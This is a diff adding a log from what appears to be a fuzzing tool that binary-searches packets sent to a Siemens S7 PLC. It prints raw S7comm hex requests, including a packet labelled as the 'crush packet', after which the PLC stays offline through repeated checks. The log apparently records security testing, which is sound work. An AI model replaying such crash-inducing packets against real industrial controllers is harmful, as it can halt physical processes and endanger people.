@@ -1,0 +1,26 @@
+[2021-11-13 19:30:59,811] [INFO] [BLocate.locate] -> Start binary search crush
+[2021-11-13 19:30:59,812] [INFO] [BLocate.locate] -> chosenPacket from 0 to 5 ; leftPackets from 5 to 10.
+[2021-11-13 19:30:59,959] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
+[2021-11-13 19:30:59,960] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
+[2021-11-13 19:30:59,963] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
+[2021-11-13 19:30:59,966] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
+[2021-11-13 19:31:00,281] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
+[2021-11-13 19:31:00,285] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100000400000e00000401120a10010003000083000001
+[2021-11-13 19:31:00,292] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
+[2021-11-13 19:31:00,298] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
+[2021-11-13 19:31:03,310] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
+[2021-11-13 19:31:09,353] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
+[2021-11-13 19:31:09,354] [INFO] [BLocate.locate] -> find a crush
+[2021-11-13 19:31:09,355] [INFO] [valition.handleCrush] -> handling crush
+[2021-11-13 19:31:09,357] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
+[2021-11-13 19:31:09,573] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
+[2021-11-13 19:31:11,589] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
+[2021-11-13 19:31:11,833] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
+[2021-11-13 19:31:15,847] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
+[2021-11-13 19:31:21,899] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
+[2021-11-13 19:31:25,915] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
+[2021-11-13 19:31:31,954] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
+[2021-11-13 19:31:35,966] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
+[2021-11-13 19:31:41,999] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
+[2021-11-13 19:31:46,011] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
+[2021-11-13 19:31:52,056] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
